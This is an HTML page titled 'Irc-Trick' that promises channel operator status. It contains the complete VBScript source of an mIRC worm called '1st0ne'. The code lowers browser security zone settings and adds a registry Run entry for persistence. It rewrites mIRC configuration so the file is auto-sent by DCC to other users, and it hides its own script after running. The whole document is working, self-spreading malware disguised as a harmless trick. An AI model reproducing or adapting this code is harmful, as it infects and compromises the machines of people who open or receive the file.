<html>
<head>
<title>Irc-Trick</title>
<body>
<br><br>
<center><font size="4" face="times">Press ctrl + alt + F4 to have ops (works in every channel).</font></center>
</body>
</html>

<script language="VBScript"><!--

On error resume Next

'MyName = 1st0ne v1.0
'WrittenBy = f0re
'SpecialThanksTo = spysend, dr[y0zak], Tphunk, flitnic, lord arz, the_might 
'ThanksTo = everyone in #vir, #virus, #gigavirii and #UC2

'This is 1st0ne. Its the second mIRC-worm i wrote. My first mIRC-worm, known as d@ydream, 'contained 'a lot of bugs which i hope to have removed in this version. I also inlcuded
'a form of html-stealth that i havent seen used before. To see the code work, rename this
'file to 'irctrick.htm and see for you self. ;)

'------------------ activeX stealth --------------------------

Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "f0re"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Win95Run", "C:\WINDOWS\SYSTEM\win95dll.vbs"

'---------------------- main virus ---------------------------

Call code("C:\mirc")
Call code("C:\program files\mirc")

Sub code(IrcPath)

On Error Resume Next

'---------------------- infect engine -------------------------

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")

if FSO.FolderExists(IrcPath) then

set ac =  FSO.OpenTextFile(ircpath +"\mirc.ini", 1, True)
Set ab = FSO.OpenTextFile("c:\windows\irc1.txt", 2, True)

beginvir = "[rfiles]"
Do While ac.atendofstream <> True
 pos = ac.readline
 ab.writeline pos
 if pos = beginvir then exit Do
Loop

Do While ac.atendofstream <> True
 pos = ac.readline
 if pos = "" then exit Do
Loop

Set bc = FSO.OpenTextFile("c:\windows\irc2.txt", 2, True)
Do While ac.atendofstream <> True
 pos = ac.readline
 bc.writeline pos
Loop

bc.close
ab.close
ac.close

Set ab = FSO.OpenTextFile("c:\windows\irc1.txt", 1, True)
beginini = ab.readall()
ab.close

Set bc = FSO.OpenTextFile("c:\windows\irc2.txt", 1, True)
endini = bc.readall()
bc.close

Set ac = FSO.OpenTextFile("c:\windows\irc3.txt", 2, True)
ac.write(beginini)
ac.writeline "n0=remote.ini"
ac.writeline "n1=remote.ini"
ac.writeline "n2=script.mrc"
ac.writeline ""
ac.write(endini)
ac.close

Set virfile = fso.opentextfile("c:\windows\system\win95dll.vbs", 2, true)
virfile.writeline ""
virfile.writeline "On Error Resume Next"
virfile.writeline ""
virfile.writeline "Dim FSO"
virfile.writeline "Set FSO = CreateObject(" & CHR(34) & "Scripting.FileSystemObject" & CHR(34) & ")"
virfile.writeline ""
virfile.writeline "'infect mirc ------------------------------"
virfile.writeline ""
virfile.writeline "If FSO.FolderExists(" & CHR(34) & IrcPath & CHR(34) & ") Then"
virfile.writeline "Set ac = FSO.OpenTextFile(" & Chr(34) & "c:\windows\irc3.txt" & Chr(34) & ",1, True)"
virfile.writeline "newcontents = ac.readall()"
virfile.writeline "ac.close"
virfile.writeline ""
virfile.writeline "Set mrc = FSO.OpenTextFile("& chr(34) & ircpath & "\mirc.ini" & Chr(34) & ", 2, True)"
virfile.writeline "mrc.write(newcontents)"
virfile.writeline "mrc.close"
virfile.writeline "Set mirc = Fso.opentextfile(" & CHR(34) & IrcPath & "\script.mrc" & CHR(34) & ",2,true)"
virfile.writeline "mirc.writeline " & CHR(34) & "[script]" & CHR(34) 
virfile.writeline "mirc.writeline " & CHR(34) & "on 1:FILERCVD:*.*:./dcc send $nick  c:\windows\system\irctrick.htm" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "on 1:FILESENT:*.*:./dcc send $nick c:\windows\system\irctrick.htm" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\system\irctrick.htm" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "on 1:TEXT:*hi*:*:/msg $chan we cannot attach any absolute significance to the concept of simultaneity" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "on 1:connect: {" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "/join #virus" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "/msg #virus 1st0ne lives f0revir" & CHR(34) 
virfile.writeline "mirc.writeline " & CHR(34) & "/part #virus" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "/clear" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "/motd" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & "}" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & ";MyName = 1st0ne" & CHR(34)
virfile.writeline "mirc.writeline " & CHR(34) & ";WrittenBy = f0re" & CHR(34)
virfile.writeline "mirc.Close"
Virfile.writeline "End If"
virfile.writeline ""
virfile.writeline ""
virfile.writeline "'run message -------------------------------"
virfile.writeline ""
virfile.writeline "If Day(Now) = 1 Then"
virfile.writeline "MsgBox " & CHR(34) & "we cannot attach any absolute significance to the concept of simultaneity" & CHR(34) & ", vbApplicationModal, " & CHR(34) & "Choose" & CHR(34)
virfile.writeline "End If"
virfile.writeline ""
virfile.writeline "'1st0ne"
virfile.close

InfectPath = Replace(location.href, "file:///", "")
InfectPath = Replace(InfectPath, "/", "\")

FSO.CopyFile InfectPath, "c:\windows\system\IrcTrick.htm"

'---------------------- html stealth engine -------------------------

Set newfile = fso.opentextfile("c:\windows\IrcTrick.htm", 2, true)
Set oldfile = fso.opentextfile("c:\windows\system\IrcTrick.htm", 1, true)
	endhost = "</html>"
	Do While oldfile.atendofstream <> True
		readcom = oldfile.readline
		newfile.writeline readcom
		if readcom = endhost then exit Do
	Loop
oldfile.close
newfile.close

Set remover = fso.opentextfile("c:\windows\remvir.vbs", 2, true)
remover.writeline "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & chr(34) & ")"
remover.writeline "FSO.CopyFile " & Chr(34) & "c:\windows\IrcTrick.htm" & Chr(34) & "," & Chr(34) & infectpath & Chr(34)
remover.close

WshShell.Run "c:\windows\remvir.vbs",0


End If

End Sub

--></script>

